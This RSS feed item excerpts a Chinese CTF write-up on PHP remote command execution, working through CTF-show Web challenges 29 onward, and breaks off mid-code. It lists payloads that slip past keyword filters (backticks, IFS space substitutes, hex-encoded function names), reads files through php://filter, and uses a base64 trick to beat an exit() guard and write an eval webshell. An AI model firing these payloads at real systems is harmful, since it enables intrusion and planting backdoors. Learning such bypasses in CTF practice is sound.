<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>RCE on Console.makeHappy(_1ming)</title>
    <link>https://shenyimings.github.io/tags/rce/</link>
    <description>Recent content in RCE on Console.makeHappy(_1ming)</description>
    <image>
      <url>https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://shenyimings.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 20 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://shenyimings.github.io/tags/rce/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>RCE 远程命令执行漏洞</title>
      <link>https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/</link>
      <pubDate>Wed, 20 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/</guid>
      <description>本文以CTF-show Web入门29-41题作为例题，学习RCE相关知识。
Web 29 过滤了flag字样
?c=system(&amp;quot;cat f*&amp;quot;);Web 30 过滤了flag|system|php三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过
echo `cat f\lag.ph\p`; 反引号可以执行系统命令
Web 31 在cat被禁时，我们还可以采用如下命令
 1.tac：从最后一行开始显示，是cat的反向显示 2.more：一页一页的显示档案内容 3.less：与more类似 4.head：查看文档的前几行 5.tail：查看文档的后几行 6.nl：显示的时候，顺便输入行号 7.od：以二进制的方式读取档案内容 8.vi：一种编辑器 9.uniq：查看 10.vim：一种编译器
 空格的代替符号：
 1.${IFS}2.$IFS$13.${IFS4.%205.&amp;lt;和&amp;lt;&amp;gt;重定向符6.%09 构造本题payload
?c=echo&amp;#39;more%09f*&amp;#39;;  其他题解：
?c=eval($_GET[1]);&amp;amp;1=system(&amp;#39;cat flag.php&amp;#39;);嵌套脱离了c的正则判断 ?c=echo`strings%09f*`; ?c=&amp;#34;\x73\x79\x73\x74\x65\x6d&amp;#34;(&amp;#34;nl%09fl[a]*&amp;#34;);等价于system()。这个学到了！  Web 32 屏蔽了echo
分号可以用?&amp;gt;代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。
?c=include&amp;#34;$_GET[1]&amp;#34;?&amp;gt;&amp;amp;1=php://filter/read=convert.base64- encode/resource=flag.php 绕过死亡EXIT - CNSS 太极掌门人 &amp;lt;?php $filename=$_GET[&amp;#39;filename&amp;#39;]; $content=$_GET[&amp;#39;content&amp;#39;]; file_put_contents($filename,&amp;#34;&amp;lt;?php exit();&amp;#34;.$content); 两个参数变量间用exit()方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？
我们只需要将content前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。
base64绕过 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
?filename=php://filter/convert.base64-decode/resource=1.php&amp;amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== [😮Mid]太极掌门人 &amp;lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir !</description>
    </item>
    
  </channel>
</rss>
